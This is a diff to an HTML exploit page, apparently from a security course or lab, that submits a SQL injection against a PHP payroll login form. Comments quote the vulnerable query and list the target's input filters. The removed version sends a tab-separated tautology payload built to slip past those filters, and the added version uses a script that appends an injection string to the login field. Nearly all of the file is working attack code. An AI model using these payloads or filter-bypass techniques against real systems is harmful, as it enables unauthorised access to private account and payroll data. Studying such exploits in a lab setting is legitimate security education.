@@ -8,18 +8,25 @@
         </script>
     </head>
     <body>
-        <form action="http://payroll.gatech.edu/index.php" onsubmit="document.forms[0].submit()" method="POST">
-        <!-- needs to inject into line 58 of auth.php -->
+        <form action="http://payroll.gatech.edu/index.php" onsubmit="" method="POST">
+        <!-- needs to inject into auth.php:58 -->
         <!-- $sql = "SELECT user_id, name, eid FROM users WHERE eid='$escaped_username' AND password='$hash'"; -->
         <!-- filters: --, ;, /*, */, //, , #, ||, admin, union, collate, drop -->
-        <input name="login" id="targetlogin" value="''\tOR\t''=''\t" />
-        <!-- from line 8 of index.php -->
-        <input type='hidden' name='RWFzdGVyRWdnRm9yU3VtbWVyMjAxOVQzDQo' value='RWFzdGVyRWdnRm9yU3VtbWVyMjAxOVQzDQo'>
-        <input type='hidden' name='secret' value='whatdoido?'>
-        <!-- from lines 6-7 of index.php -->
-        <input type='hidden' name='action' value='login?'>
-        <button id="exploit">Hold onto your butts!</button>
+            <!-- index.php:30 -->
+            <input type="hidden" name="RWFzdGVyRWdnRm9yU3VtbWVyMjAxOVQzDQo" value="RWFzdGVyRWdnRm9yU3VtbWVyMjAxOVQzDQo">
+            <!-- index.php:36 -->
+            <input id="action" type="hidden" name="action" value="login"/>
+            <input name="login" id="targetlogin" value="username" />
+            <button id="exploit" onClick="sqlInject()">Hold onto your butts!</button>
         </form>
+
+        <script>
+            function sqlInject() {
+                var statement = document.getElementById("targetlogin").value;
+                statement += "'-;-";
+                document.getElementById("targetlogin").value = statement;
+            }
+        </script>
     </body>
 </html>
 
